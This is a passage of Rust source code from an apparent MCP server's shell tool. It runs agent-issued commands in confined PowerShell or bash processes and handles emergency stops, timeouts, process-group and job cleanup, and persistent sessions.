            return Err(format!("no thread of process {pid} could be resumed"));
        }
        Ok(())
    }

    /// End the listed jobs of servers that are still running (by name).
    pub(super) fn end_live_listed(dir: &Path, code: u32) {
        let own = JOB.get().and_then(|j| j.as_ref()).map(|(_, n)| n.as_str());
        let Ok(entries) = std::fs::read_dir(dir) else { return };
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().into_owned();
            if name.starts_with(PREFIX) && Some(name.as_str()) != own {
                if let Ok(job) = Job::open_named(&name) {
                    let _ = job.terminate(code);
                }
            }
        }
    }

    /// End every listed job: a live server's by name, a dead server's from its
    /// snapshot. A dead server's file is dropped once nothing it lists runs.
    pub(super) fn end_all_listed(dir: &Path, code: u32) {
        let own = JOB.get().and_then(|j| j.as_ref()).map(|(_, n)| n.as_str());
        let Ok(entries) = std::fs::read_dir(dir) else { return };
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().into_owned();
            let well_formed = name
                .strip_prefix(PREFIX)
                .is_some_and(|rest| !rest.is_empty() && rest.chars().all(|c| c.is_ascii_digit() || c == '-'));
            if !well_formed {
                continue;
            }
            if Some(name.as_str()) == own {
                continue; // ended directly by end_on_stop
            }
            match Job::open_named(&name) {
                // Its server is alive: end the whole job.
                Ok(job) => {
                    let _ = job.terminate(code);
                }
                // Its server is gone: end what its snapshot lists, and forget
                // it once nothing listed is left.
                Err(_) => {
                    if !end_snapshot(&entry.path(), code) {
                        let _ = std::fs::remove_file(entry.path());
                    }
                }
            }
        }
    }
}

#[cfg(unix)]
mod platform {
    use std::collections::HashMap;
    use std::sync::Mutex;

    /// Process groups of the shells this process started (a shell is its
    /// group's leader, so the group id is its pid), with the leader's start
    /// time; and the list length at which ended groups are next pruned.
    static GROUPS: Mutex<(Vec<(u32, u64)>, usize)> = Mutex::new((Vec::new(), MIN_PRUNE_AT));

    /// Prune no more often than this many remembered groups: pruning reads
    /// all of /proc once.
    const MIN_PRUNE_AT: usize = 64;

    /// A process's start time (clock ticks since boot, /proc/<pid>/stat field
    /// 22), to tell a group's leader from a later process that reused its id.
    pub(super) fn start_time(pid: u32) -> Option<u64> {
        stat_fields(pid).map(|(_, t)| t)
    }

    /// (process group id, start time) of `pid`, from /proc/<pid>/stat.
    fn stat_fields(pid: u32) -> Option<(u32, u64)> {
        let stat = std::fs::read_to_string(format!("/proc/{pid}/stat")).ok()?;
        // Fields after the command name, which is in parentheses and may hold spaces.
        let rest = stat.rsplit_once(')')?.1;
        let f: Vec<&str> = rest.split_whitespace().collect();
        Some((f.get(2)?.parse().ok()?, f.get(19)?.parse().ok()?))
    }

    /// One read of the process table: each process's start time, and the
    /// start times of each group's members.
    #[derive(Default)]
    pub(super) struct ProcTable {
        start: HashMap<u32, u64>,
        groups: HashMap<u32, Vec<u64>>,
    }

    impl ProcTable {
        /// Build from (pid, pgid, start time) rows.
        pub(super) fn from_rows(rows: impl IntoIterator<Item = (u32, u32, u64)>) -> Self {
            let mut t = ProcTable::default();
            for (pid, pgid, start) in rows {
                t.start.insert(pid, start);
                t.groups.entry(pgid).or_default().push(start);
            }
            t
        }

        /// Read all of /proc once.
        fn read() -> Self {
            let Ok(dir) = std::fs::read_dir("/proc") else { return Self::default() };
            Self::from_rows(dir.flatten().filter_map(|e| {
                let pid = e.file_name().to_str()?.parse::<u32>().ok()?;
                let (pgid, start) = stat_fields(pid)?;
                Some((pid, pgid, start))
            }))
        }

        /// Whether a group id may still be signalled: its leader is still the
        /// process Ghost started, or the leader has exited (a group id cannot
        /// be handed to a new process while the old group has members). A
        /// process with that id but a different start time means the id was
        /// reused.
        pub(super) fn group_still_ours(&self, pgid: u32, leader_start: u64) -> bool {
            match self.start.get(&pgid) {
                Some(&t) => t == leader_start,
                // The leader exited: signal only while the group still has a
                // member that started after the leader (what the shell's
                // command started). An empty group is left alone - its id may
                // already be someone else's. One case cannot be told apart
                // here: the id was reused by a new group leader that then
                // exited too while its own group lives on, all between two
                // stops (rare; documented).
                None => self.groups.get(&pgid).is_some_and(|m| m.iter().any(|&t| t >= leader_start)),
            }
        }
    }

    pub(super) fn confine(pid: Option<u32>) -> Result<(), String> {
        let pid = pid.ok_or("the shell has no process id")?;
        let t = start_time(pid)
            .ok_or("could not read the shell's start time, so a stop could not tell its group from a reused id")?;
        {
            let mut g = GROUPS.lock().unwrap();
            g.0.push((pid, t));
            // Forget groups that have ended, once the list has doubled
            // since the last prune: one /proc read amortized over many
            // shells, so a long-lived server's list stays bounded.
            if g.0.len() >= g.1 {
                let table = ProcTable::read();
                g.0.retain(|&(pgid, start)| table.group_still_ours(pgid, start));
                g.1 = (g.0.len() * 2).max(MIN_PRUNE_AT);
            }
        }
        super::stop_kill::ensure_watcher();
        Ok(())
    }

    #[cfg(test)]
    pub(super) fn remember_for_test(pgid: u32, leader_start: u64) {
        GROUPS.lock().unwrap().0.push((pgid, leader_start));
    }

    #[cfg(test)]
    pub(super) fn remembered_for_test() -> usize {
        GROUPS.lock().unwrap().0.len()
    }

    /// [`ProcTable::group_still_ours`] against the live process table (a
    /// full read only when the leader has exited).
    pub(super) fn group_still_ours(pgid: u32, leader_start: u64) -> bool {
        match start_time(pgid) {
            Some(t) => t == leader_start,
            None => ProcTable::read().group_still_ours(pgid, leader_start),
        }
    }

    /// Kill group `pgid` if it is still the one Ghost started.
    pub(super) fn end_group(pgid: u32, leader_start: u64) {
        if group_still_ours(pgid, leader_start) {
            kill_group(pgid);
        }
    }

    fn kill_group(pgid: u32) {
        let _ = std::process::Command::new("kill")
            .args(["-KILL", "--", &format!("-{pgid}")])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
    }

    /// The groups of `groups` still to be signalled, judged against one read
    /// of the process table.
    pub(super) fn groups_to_end(groups: &[(u32, u64)], table: &ProcTable) -> Vec<u32> {
        groups.iter().filter(|&&(pgid, start)| table.group_still_ours(pgid, start)).map(|&(pgid, _)| pgid).collect()
    }

    /// This server's own shells are exactly what a stop ends here.
    pub(super) fn end_own() {
        end_on_stop();
    }

    /// Kill every group this process started that is still ours, then forget
    /// them all.
    pub(super) fn end_on_stop() {
        let groups: Vec<(u32, u64)> = {
            let mut g = GROUPS.lock().unwrap();
            g.1 = MIN_PRUNE_AT;
            std::mem::take(&mut g.0)
        };
        if groups.is_empty() {
            return;
        }
        for pgid in groups_to_end(&groups, &ProcTable::read()) {
            kill_group(pgid);
        }
    }
}

use platform::confine;

/// Start a shell and put it in the stop job (Windows) or group list (Linux).
///
/// Windows: the shell starts suspended and only runs once it is in the job,
/// so nothing it starts can be born outside the job (under load, a shell
/// started running could launch a program before adoption, and the stop then
/// missed it). Also sets CREATE_NO_WINDOW (see `no_console_window`).
/// `adopt_delay` is zero except in tests, which widen the window between
/// start and adoption to prove nothing escapes through it.
fn spawn_confined(command: &mut Command, adopt_delay: Duration) -> std::io::Result<(Child, Option<Group>)> {
    spawn_confined_with(command, adopt_delay, &confine)
}

/// [`spawn_confined`] with the confining step injected, so a test can make it fail.
fn spawn_confined_with(
    command: &mut Command,
    adopt_delay: Duration,
    confine: &dyn Fn(Option<u32>) -> std::result::Result<(), String>,
) -> std::io::Result<(Child, Option<Group>)> {
    #[cfg(windows)]
    {
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        const CREATE_SUSPENDED: u32 = 0x0000_0004;
        command.creation_flags(CREATE_NO_WINDOW | CREATE_SUSPENDED);
    }
    let mut child = command.spawn()?;
    if !adopt_delay.is_zero() {
        std::thread::sleep(adopt_delay);
    }
    // Fail closed: a shell the stop cannot reach never runs (on Windows it is
    // still suspended here).
    if let Err(e) = confine(child.id()) {
        let _ = child.start_kill();
        let until = Instant::now() + Duration::from_secs(2);
        while matches!(child.try_wait(), Ok(None)) && Instant::now() < until {
            std::thread::sleep(Duration::from_millis(5));
        }
        return Err(std::io::Error::other(format!("refused to run the shell, the emergency stop could not reach it: {e}")));
    }
    // Still suspended on Windows: the shell's own job is in place before it
    // can start anything.
    let group = group_of(child.id());
    #[cfg(windows)]
    if let Err(e) = child.id().ok_or_else(|| "no pid".to_string()).and_then(platform::resume) {
        let _ = child.start_kill();
        return Err(std::io::Error::other(format!("could not resume the shell: {e}")));
    }
    Ok((child, group))
}

/// The stop was seen on a shell call's own path: end this server's shells and
/// what they started now, rather than leave it to the watcher's next tick
/// (the call could otherwise return while the programs still run).
fn end_own_on_stop() {
    stop_kill::end_own_now();
}

/// What giving up on a shell ends. Linux: the process group the shell leads
/// and its leader's start time, so a later kill can tell the group from a
/// reused id. Windows: a job of the shell's own, nested in the stop job, that
/// holds the shell and everything it starts (even a program whose parent has
/// exited). Not kill-on-close: dropping it leaves what a finished command
/// started running, as on Linux; only `end_group` (or a stop) ends them.
#[cfg(unix)]
type Group = Arc<(u32, u64)>;
#[cfg(windows)]
type Group = Arc<ghost_browser::launch::job::Job>;

/// The shell's [`Group`], made at spawn. On Windows the shell is still
/// suspended and already in the stop job, so the job it joins here nests in
/// that one. None when it cannot be made: giving up then ends only the shell
/// (the stop still reaches everything through the stop job).
fn group_of(pid: Option<u32>) -> Option<Group> {
    #[cfg(unix)]
    return pid.and_then(|p| Some(Arc::new((p, platform::start_time(p)?))));
    #[cfg(windows)]
    {
        use ghost_browser::launch::job::Job;
        let pid = pid?;
        match Job::new_terminable().and_then(|j| j.adopt(pid).map(|()| j)) {
            Ok(job) => Some(Arc::new(job)),
            Err(e) => {
                tracing::warn!("shell {pid} has no job of its own ({e}); op=kill and timeouts end only the shell");
                None
            }
        }
    }
}

/// End a shell Ghost is giving up on (a timeout, `op=kill`, a dropped call):
/// its whole process group (Linux) or job (Windows), so what its command
/// started ends with it.
fn end_shell(child: &mut Child, group: Option<Group>) {
    end_group(group);
    let _ = child.start_kill();
}

/// End a shell's process group (Linux: while it is still the one Ghost
/// started) or its job (Windows).
fn end_group(group: Option<Group>) {
    #[cfg(unix)]
    if let Some(&(pgid, leader_start)) = group.as_deref() {
        platform::end_group(pgid, leader_start);
    }
    #[cfg(windows)]
    if let Some(job) = group {
        let _ = job.terminate(1);
    }
}

/// Ends a one-shot command's group if the call is dropped before the command
/// finished (the request was cancelled); `disarm` once it has finished.
struct GroupGuard(Option<Group>);

impl GroupGuard {
    fn disarm(&mut self) {
        self.0 = None;
    }
}

impl Drop for GroupGuard {
    fn drop(&mut self) {
        end_group(self.0.take());
    }
}

/// Start a shell in its own process group (Linux), so the stop can end the
/// group: the shell and everything its command started.
fn in_own_group(command: &mut Command) {
    #[cfg(unix)]
    command.process_group(0);
    #[cfg(not(unix))]
    let _ = command;
}

/// Whether a shell that ended did so because the stop ended it: a stop has
/// ended shells since this one started (`born_gen`). Not the exit code alone -
/// a command may `exit 57005` itself.
fn ended_by_stop(born_gen: u64) -> bool {
    stop_kill::generation() != born_gen
}

/// The error for a shell the stop ended: the stop itself while it is still in
/// force; once lifted, say what happened rather than claim a stop that is no
/// longer active.
fn ended_by_stop_error() -> GhostError {
    if crate::error::is_stopped() {
        GhostError::Stopped
    } else {
        GhostError::Config("this shell was ended by an emergency stop (since lifted); start a new one".into())
    }
}

/// Start one persistent driver process (PowerShell here, bash on Linux).
/// Shared by `op=open` sessions and the warm spare.
fn spawn_driver(cwd: Option<&str>) -> Result<ShellSession> {
    #[cfg(target_os = "linux")]
    let mut command = {
        let mut c = Command::new("bash");
        c.args(["--noprofile", "--norc", "-c", BASH_DRIVER_SCRIPT]);
        c
    };
    #[cfg(not(target_os = "linux"))]
    let mut command = {
        let mut c = Command::new("powershell");
        c.args(["-NoProfile", "-NoLogo", "-NonInteractive", "-EncodedCommand"])
            .arg(ps_encoded_command(DRIVER_SCRIPT));
        c
    };
    if let Some(dir) = cwd {
        command.current_dir(dir);
    }
    command
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .kill_on_drop(true);
    no_console_window(&mut command);
    in_own_group(&mut command);

    let born_gen = stop_kill::generation();
    let (mut child, group) = spawn_confined(&mut command, Duration::ZERO)
        .map_err(|e| GhostError::Config(format!("failed to start persistent shell: {e}")))?;
    let stdin = child.stdin.take().unwrap();
    let stdout = child.stdout.take().unwrap();
    let pid = child.id();
    Ok(ShellSession {
        child,
        stdin,
        reader: BufReader::new(stdout),
        nonce: 0,
        secret: session_secret(),
        pending: None,
        partial: Vec::new(),
        killed: Arc::new(AtomicBool::new(false)),
        created: Instant::now(),
        pid,
        born_gen,
        group,
    })
}

/// Standard-alphabet base64 (encode only). Avoids pulling a dependency for a
/// dozen lines; the persistent driver decodes with [Convert]::FromBase64String.
fn b64_encode(input: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(input.len().div_ceil(3) * 4);
    for chunk in input.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = *chunk.get(1).unwrap_or(&0) as u32;
        let b2 = *chunk.get(2).unwrap_or(&0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(T[((n >> 18) & 63) as usize] as char);
        out.push(T[((n >> 12) & 63) as usize] as char);
        out.push(if chunk.len() > 1 { T[((n >> 6) & 63) as usize] as char } else { '=' });
        out.push(if chunk.len() > 2 { T[(n & 63) as usize] as char } else { '=' });
    }
    out
}

/// PowerShell `-EncodedCommand` payload: base64 of the UTF-16LE script bytes.
/// Used by the `pwsh` one-shot arm, which is reachable on Linux too.
fn ps_encoded_command(script: &str) -> String {
    let mut utf16le = Vec::with_capacity(script.len() * 2);
    for u in script.encode_utf16() {
        utf16le.extend_from_slice(&u.to_le_bytes());
    }
    b64_encode(&utf16le)
}

/// The persistent-session driver loop. Reads framed commands, runs them,
/// prints a nonce-stamped sentinel after each.
#[cfg(not(target_os = "linux"))]
const DRIVER_SCRIPT: &str = r#"
$ErrorActionPreference='Continue'
$ProgressPreference='SilentlyContinue'
[Console]::OutputEncoding=[System.Text.Encoding]::UTF8
while($true){
  $line=[Console]::In.ReadLine()
  if($null -eq $line){break}
  if($line.Length -eq 0){continue}
  $sp=$line.IndexOf(' ')
  if($sp -lt 0){continue}
  $nonce=$line.Substring(0,$sp)
  $b64=$line.Substring($sp+1)
  $cmd=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))
  $global:LASTEXITCODE=0
  $fail=[System.Collections.Generic.List[object]]::new()
  try{$o=. ([ScriptBlock]::Create($cmd)) 2>&1|ForEach-Object{if($_ -is [System.Management.Automation.ErrorRecord] -and $_.FullyQualifiedErrorId -notlike 'NativeCommandError*'){$fail.Add($_)};$_}|Out-String;[Console]::Out.Write($o)}catch{$fail.Add($_);[Console]::Out.Write(($_|Out-String))}
  $code=$LASTEXITCODE; if($null -eq $code){$code=0}
  if($code -eq 0 -and $fail.Count -gt 0){$code=1}
  [Console]::Out.WriteLine("__GHOST_DONE_${nonce}__ $code")
  [Console]::Out.Flush()
}
"#;

/// The same persistent-session protocol as `DRIVER_SCRIPT`, for POSIX shells.
///
/// Reads `<nonce> <base64-command>` lines, evaluates the command with stdout and
/// stderr merged, then writes the sentinel plus the exit code. Base64 framing is
/// what makes this injection-safe: the command text never has to survive shell
/// quoting on the way in.
#[cfg(target_os = "linux")]
const BASH_DRIVER_SCRIPT: &str = r#"
while IFS= read -r line; do
  [ -z "$line" ] && continue
  nonce="${line%% *}"
  b64="${line#* }"
  cmd="$(printf '%s' "$b64" | base64 -d 2>/dev/null)"
  eval "$cmd" 2>&1
  code=$?
  echo "__GHOST_DONE_${nonce}__ $code"
done
"#;

/// The shell used when the caller does not name one.
pub(crate) fn default_shell() -> &'static str {
    #[cfg(target_os = "linux")]
    {
        "bash"
    }
    #[cfg(not(target_os = "linux"))]
    {
        "powershell"
    }
}

/// Refuse a `cwd` that is not an existing directory, before any shell starts.
/// Without this the cold path failed to spawn (os error 267) while the warm
/// path's Set-Location failed quietly and ran the command in the server's cwd.
/// Returns the directory to use: a leading `~` (`~`, `~/x`, `~\x`) is the
/// user's home.
fn check_cwd(cwd: Option<&str>) -> Result<Option<String>> {
    let home = std::env::var_os(if cfg!(windows) { "USERPROFILE" } else { "HOME" });
    resolve_cwd(cwd, home.as_deref().and_then(|h| h.to_str()))
}

/// [`check_cwd`] with the home directory given.
fn resolve_cwd(cwd: Option<&str>, home: Option<&str>) -> Result<Option<String>> {
    let Some(dir) = cwd else { return Ok(None) };
    let sep = |c: char| c == '/' || (cfg!(windows) && c == '\\');
    let rest = dir.strip_prefix('~').filter(|r| r.is_empty() || r.starts_with(sep));
    let path = match (rest, home) {
        (Some(rest), Some(home)) => format!("{home}{rest}"),
        (Some(_), None) => {
            return Err(GhostError::Config(format!(
                "ghost_shell: cwd '{dir}' starts with ~ but the home directory is unknown; give a full path"
            )))
        }
        (None, _) => dir.to_string(),
    };
    if std::path::Path::new(&path).is_dir() {
        return Ok(Some(path));
    }
    // PowerShell provider drives (HKLM:\, Env:, Cert:\) are not directories
    // a shell can start in; say so rather than "does not exist".
    let provider = dir.split_once(':').is_some_and(|(d, _)| d.len() > 1 && d.chars().all(|c| c.is_ascii_alphanumeric()));
    let hint = if provider { " (PowerShell provider paths such as HKLM:\\ or Env: are not file-system directories)" } else { "" };
    Err(GhostError::Config(format!("ghost_shell: cwd '{dir}' is not an existing directory{hint}")))
}

/// How long `op=read` waits: the caller's `timeout_ms`, else a short default.
fn read_wait(ms: Option<u64>) -> Duration {
    clamp_timeout(Some(ms.unwrap_or(DEFAULT_READ_WAIT_MS)))
}

fn clamp_timeout(ms: Option<u64>) -> Duration {
    Duration::from_millis(ms.unwrap_or(DEFAULT_TIMEOUT_MS).min(MAX_TIMEOUT_MS))
}

/// Tail-truncate to the output cap, appending a marker with the dropped byte count.
fn cap_output(mut s: String) -> (String, bool) {
    if s.chars().count() <= MAX_OUTPUT_CHARS {
        return (s, false);
    }
    let keep_from = s.char_indices().rev().nth(MAX_OUTPUT_CHARS - 1).map(|(i, _)| i).unwrap_or(0);
    let dropped = keep_from;
    s = format!("...[{dropped} bytes truncated]...\n{}", &s[keep_from..]);
    (s, true)
}

impl GhostSession {
    /// Dispatch entry for the `ghost_shell` MCP verb.
    pub async fn shell(&self, args: &Value) -> Result<Value> {
        if shell_disabled() {
            return Err(GhostError::Config(
                "ghost_shell is disabled (GHOST_SHELL is off). The operator turns it on by removing that setting - in Claude Desktop it is the \"Allow shell commands\" checkbox on the extension.".into(),
            ));
        }
        let op = args.get("op").and_then(|v| v.as_str()).unwrap_or("run");
        // Backstop for callers that do not come through the MCP gate: starting
        // or feeding a command is an action; list, read and kill are not.
        if matches!(op, "run" | "open" | "send") {
            crate::error::ensure_not_stopped()?;
        }
        match op {
            "run" => self.shell_run(args).await,
            "open" => shell_open(&self.shells, args).await,
            "send" => shell_send(&self.shells, args).await,
            "read" => shell_read(&self.shells, args).await,
            "list" => Ok(shell_list(&self.shells)),
            "kill" => shell_kill(&self.shells, args).await,
            other => Err(GhostError::Config(format!(
                "ghost_shell: unknown op '{other}'; use run|open|send|read|list|kill"
            ))),
        }
    }

    async fn shell_run(&self, args: &Value) -> Result<Value> {
        let cmd = args
            .get("cmd")
            .and_then(|v| v.as_str())
            .ok_or_else(|| GhostError::Config("ghost_shell op=run: missing 'cmd'".into()))?;
        let shell = args.get("shell").and_then(|v| v.as_str()).unwrap_or(default_shell());
        let cwd = check_cwd(args.get("cwd").and_then(|v| v.as_str()))?;
        let cwd = cwd.as_deref();
        let dur = clamp_timeout(args.get("timeout_ms").and_then(|v| v.as_u64()));

        // Warm path: hand the command to the pre-spawned PowerShell. Only the
        // default shell qualifies (cmd starts in ~15 ms anyway; pwsh is rarely
        // installed). A spare that died is discarded; either way the next
        // spare is started before this command runs, so its warm-up overlaps
        // the agent's thinking instead of the agent's waiting.
        if cfg!(not(target_os = "linux")) && shell == "powershell" && !warm_disabled() {
            let spare = self.shells.lock().unwrap().warm.take();
            self.replenish_warm();
            if let Some(mut sess) = spare {
                if matches!(sess.child.try_wait(), Ok(None)) {
                    return self.run_on_spare(sess, cmd, cwd, dur, shell).await;
                }
            }
        }

        let mut command = build_oneshot(shell, cmd)?;
        if let Some(dir) = cwd {
            command.current_dir(dir);
        }
        command
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);

        in_own_group(&mut command);
        let started = Instant::now();
        let born_gen = stop_kill::generation();
        let (mut child, group) = spawn_confined(&mut command, Duration::ZERO)
            .map_err(|e| GhostError::Config(format!("failed to spawn {shell}: {e}")))?;
        let mut guard = GroupGuard(group.clone());
        let mut stdout = child.stdout.take().unwrap();
        let mut stderr = child.stderr.take().unwrap();

        let mut obuf = Vec::new();
        let mut ebuf = Vec::new();
        let collect = async {
            use tokio::io::AsyncReadExt;
            let _ = tokio::join!(stdout.read_to_end(&mut obuf), stderr.read_to_end(&mut ebuf));
        };

        let mut timed_out = false;
        let mut stopped = false;
        tokio::select! {
            _ = collect => {}
            _ = tokio::time::sleep(dur) => { timed_out = true; }
            _ = wait_for_stop() => { stopped = true; }
        }
        if stopped {
            end_own_on_stop();
        }
        if timed_out || stopped {
            end_shell(&mut child, group);
        }
        let status = child.wait().await.ok();
        guard.disarm();

        if stopped {
            return Err(GhostError::Stopped);
        }
        if ended_by_stop(born_gen) {
            return Err(ended_by_stop_error());
        }

        let mut merged = String::from_utf8_lossy(&obuf).into_owned();
        if !ebuf.is_empty() {
            let err = String::from_utf8_lossy(&ebuf);
            // PowerShell serializes its own error/progress records to stderr as
            // CLIXML when stderr is redirected. Native-child stderr (git, node) is
            // plain text and passes through; CLIXML noise is stripped to text.
            merged.push_str(&sanitize_ps_stderr(&err));
        }
        let (output, truncated) = cap_output(merged);
        Ok(json!({
            "ok": !timed_out,
            "output": output,
            "exit_code": status.and_then(|s| s.code()),
            "duration_ms": started.elapsed().as_millis() as u64,
            "truncated": truncated,
            "timed_out": timed_out,
            "shell": shell,
        }))
    }

    /// Start the next spare. Process creation is a few milliseconds; the
    /// PowerShell warm-up itself happens in the child, off the request path.
    fn replenish_warm(&self) {
        match spawn_driver(None) {
            Ok(s) => self.shells.lock().unwrap().warm = Some(s),
            Err(e) => tracing::warn!("ghost_shell: could not start a warm spare: {e}"),
        }
    }

    /// Run one `op=run` command on a warm spare. Same response shape as the
    /// one-shot path plus `warm: true`. The spare is single-use: it is killed
    /// once the command has answered (or timed out), never reused, so state
    /// cannot leak between commands.
    async fn run_on_spare(
        &self,
        mut sess: ShellSession,
        cmd: &str,
        cwd: Option<&str>,
        dur: Duration,
        shell: &str,
    ) -> Result<Value> {
        let started = Instant::now();
        let script = match cwd {
            Some(dir) => format!("{}{cmd}", cwd_prefix(dir)),
            None => cmd.to_string(),
        };
        sess.nonce += 1;
        let token = sentinel_token(&sess.secret, sess.nonce);
        let frame = format!("{} {}\n", token, b64_encode(script.as_bytes()));
        // Armed before the command is sent: a call dropped from here on
        // (cancelled, or past its deadline) ends the command's programs too,
        // as on the one-shot path.
        let mut guard = GroupGuard(sess.group.clone());
        if let Err(e) = sess.stdin.write_all(frame.as_bytes()).await {
            let _ = sess.child.start_kill();
            return Err(GhostError::Config(format!("ghost_shell: warm shell write failed: {e}")));
        }
        let _ = sess.stdin.flush().await;

        let outcome = read_until_sentinel(&mut sess, &token, dur).await;
        let duration_ms = started.elapsed().as_millis() as u64;
        if matches!(outcome, ReadOutcome::Done { .. } | ReadOutcome::Eof { .. }) {
            guard.disarm();
        }
        match outcome {
            ReadOutcome::Done { output, exit_code } => {
                let _ = sess.child.start_kill();
                let (output, truncated) = cap_output(output);
                Ok(json!({
                    "ok": true, "output": output, "exit_code": exit_code,
                    "duration_ms": duration_ms, "truncated": truncated,
                    "timed_out": false, "shell": shell, "warm": true,
                }))
            }
            ReadOutcome::TimedOut { output } => {
                end_shell(&mut sess.child, sess.group.clone());
                let (output, truncated) = cap_output(output);
                Ok(json!({
                    "ok": false, "output": output, "exit_code": Value::Null,
                    "duration_ms": duration_ms, "truncated": truncated,
                    "timed_out": true, "shell": shell, "warm": true,
                }))
            }
            // A spare is never in the registry, so nothing kills it; treat a
            // kill like a stop if it ever happens.
            ReadOutcome::Stopped | ReadOutcome::Killed => {
                if crate::engine::input::hotkey::is_stopped() {
                    end_own_on_stop();
                }
                let _ = sess.child.start_kill();
                Err(GhostError::Stopped)
            }
            ReadOutcome::Eof { output } => {
                // The command ended the shell itself (`exit N`): the process exit
                // status is the command's exit code, exactly as in the one-shot path.
                let status = sess.child.wait().await.ok();
                if ended_by_stop(sess.born_gen) {
                    return Err(ended_by_stop_error());
                }
                let (output, truncated) = cap_output(output);
                Ok(json!({
                    "ok": true, "output": output,
                    "exit_code": status.and_then(|s| s.code()),
                    "duration_ms": duration_ms, "truncated": truncated,
                    "timed_out": false, "shell": shell, "warm": true,
                }))
            }
        }
    }
}

async fn shell_open(shells: &Mutex<ShellRegistry>, args: &Value) -> Result<Value> {
    let cwd = check_cwd(args.get("cwd").and_then(|v| v.as_str()))?;
    let cwd = cwd.as_deref();
    let id = match args.get("id").and_then(|v| v.as_str()) {
        Some(s) if !s.trim().is_empty() => s.to_string(),
        _ => {
            let mut reg = shells.lock().unwrap();
            reg.auto_id += 1;
            format!("s{}", reg.auto_id)
        }
    };
    if shells.lock().unwrap().sessions.contains_key(&id) {
        return Err(GhostError::Config(format!(
            "ghost_shell op=open: session '{id}' already exists"
        )));
    }

    let session = spawn_driver(cwd)?;
    let pid = session.pid;
    let slot = SessionSlot {
        pid,
        group: session.group.clone(),
        created: session.created,
        killed: session.killed.clone(),
        shell: Arc::new(tokio::sync::Mutex::new(session)),
    };
    shells.lock().unwrap().sessions.insert(id.clone(), slot);
    Ok(json!({ "ok": true, "id": id, "pid": pid }))
}

/// The session `id` and exclusive use of its shell, or why not: no such
/// session, or another call is using it right now (a command is running).
fn claim(
    shells: &Mutex<ShellRegistry>,
    id: &str,
) -> Result<(SessionSlot, tokio::sync::OwnedMutexGuard<ShellSession>)> {
    let slot = shells
        .lock()
        .unwrap()
        .sessions
        .get(id)
        .cloned()
        .ok_or_else(|| GhostError::Config(format!("ghost_shell: no session '{id}'")))?;
    let guard = slot.shell.clone().try_lock_owned().map_err(|_| {
        GhostError::Config(format!(
            "ghost_shell: session '{id}' is busy: another call is running a command in it; wait for that call, or op=kill it"
        ))
    })?;
    Ok((slot, guard))
}

/// Forget session `id`, but only if it is still this slot (a kill and a new
/// open under the same id may have happened meanwhile).
fn forget(shells: &Mutex<ShellRegistry>, id: &str, slot: &SessionSlot) {
    let mut reg = shells.lock().unwrap();
    if reg.sessions.get(id).is_some_and(|s| Arc::ptr_eq(&s.shell, &slot.shell)) {
        reg.sessions.remove(id);
    }
}

async fn shell_send(shells: &Mutex<ShellRegistry>, args: &Value) -> Result<Value> {
    let id = args
        .get("id")
        .and_then(|v| v.as_str())
        .ok_or_else(|| GhostError::Config("ghost_shell op=send: missing 'id'".into()))?
        .to_string();
    let cmd = args
        .get("cmd")
        .and_then(|v| v.as_str())
        .ok_or_else(|| GhostError::Config("ghost_shell op=send: missing 'cmd'".into()))?
        .to_string();
    let dur = clamp_timeout(args.get("timeout_ms").and_then(|v| v.as_u64()));

    // The session stays in the registry while its command runs, so list
    // shows it busy and kill can end it; the guard is this call's exclusive use.
    let (slot, mut sess) = claim(shells, &id)?;

    if let Some(pend) = sess.pending {
        return Err(GhostError::Config(format!(
            "ghost_shell: session '{id}' is busy running command #{pend}; call op=read to drain it first"
        )));
    }

    sess.nonce += 1;
    let nonce = sess.nonce;
    // The driver echoes this field back verbatim, so folding the secret
    // into the nonce needs no change on the driver side.
    let token = sentinel_token(&sess.secret, nonce);
    let frame = format!("{} {}\n", token, b64_encode(cmd.as_bytes()));
    if let Err(e) = sess.stdin.write_all(frame.as_bytes()).await {
        let _ = sess.child.start_kill();
        forget(shells, &id, &slot);
        return Err(GhostError::Config(format!("ghost_shell: session '{id}' write failed: {e}")));
    }
    let _ = sess.stdin.flush().await;
    // Pending from the moment it is sent: if this call is dropped mid-read
    // (the request was cancelled), the session stays in the registry and a
    // later op=read collects the command instead of the next send mixing in.
    sess.pending = Some(nonce);

    let outcome = read_until_sentinel(&mut sess, &token, dur).await;
    finish_send(shells, id, &slot, &mut sess, nonce, outcome).await
}

async fn shell_read(shells: &Mutex<ShellRegistry>, args: &Value) -> Result<Value> {
    let id = args
        .get("id")
        .and_then(|v| v.as_str())
        .ok_or_else(|| GhostError::Config("ghost_shell op=read: missing 'id'".into()))?
        .to_string();
    let dur = read_wait(args.get("timeout_ms").and_then(|v| v.as_u64()));

    let (slot, mut sess) = claim(shells, &id)?;

    let nonce = match sess.pending {
        Some(n) => n,
        None => {
            return Ok(json!({ "ok": true, "id": id, "output": "", "busy": false, "note": "no command pending" }));
        }
    };
    let token = sentinel_token(&sess.secret, nonce);
    let outcome = read_until_sentinel(&mut sess, &token, dur).await;
    finish_send(shells, id, &slot, &mut sess, nonce, outcome).await
}

/// Common tail for send/read: apply the read outcome to session state, or
/// forget a session that is gone, and build the response.
async fn finish_send(
    shells: &Mutex<ShellRegistry>,
    id: String,
    slot: &SessionSlot,
    sess: &mut ShellSession,
    nonce: u64,
    outcome: ReadOutcome,
) -> Result<Value> {
    match outcome {
        ReadOutcome::Done { output, exit_code } => {
            sess.pending = None;
            let (output, truncated) = cap_output(output);
            Ok(json!({
                "ok": true, "id": id, "output": output,
                "exit_code": exit_code, "truncated": truncated,
                "timed_out": false, "busy": false,
            }))
        }
        ReadOutcome::TimedOut { output } => {
            sess.pending = Some(nonce);
            let (output, truncated) = cap_output(output);
            Ok(json!({
                "ok": false, "id": id, "output": output,
                "truncated": truncated, "timed_out": true, "busy": true,
